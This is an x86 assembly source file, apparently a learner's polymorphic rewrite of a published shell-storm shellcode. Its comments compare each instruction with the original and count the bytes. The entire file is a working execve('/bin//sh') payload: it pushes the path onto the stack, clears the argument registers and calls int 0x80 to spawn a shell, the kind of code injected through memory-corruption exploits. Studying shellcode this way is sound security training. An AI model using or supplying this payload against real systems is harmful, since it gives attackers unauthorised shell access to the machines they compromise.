;my version(40 bytes) 		original(28bytes) http://shell-storm.org/shellcode/files/shellcode-811.php

global _start
section .text
_start:

xor ecx,ecx			;xor %eax,%eax
sub esp,4						
;set null in the stack
mov [esp],ecx 			;push %eax
;set the //hs in eax
mov dword eax, 0x68732f2f 	;push $0x68732f2f
sub esp,4
;push the value in the stack
mov dword[esp], eax 
;set nib/
mov dword eax, 0x6e69622f 	;push $0x6e69622f
sub esp,4
;again set it in the stack
mov dword[esp],eax 				
;load the arg filename 
;/bin//sh for the call
mov ebx,esp 			;mov %esp,%ebx
xor eax, eax			;mov%eax,%ecx
;null the other args
mov edx,ecx ;* 			;mov %eax,%edx
mov al,0xb			;mov $0xb,%al
int 0x80			;int $0x80
				;the next instructions are useless, the exit syscall is not necessary since the control is passed to the shell
				;xor %eax,%eax
				;inc %eax
				;int $0x80		
								
;*the instruction could be omitted to save 2 bytes since the code works fine as well, but I prefer to leave it, 
; since I can be sure about the value or the register before the call

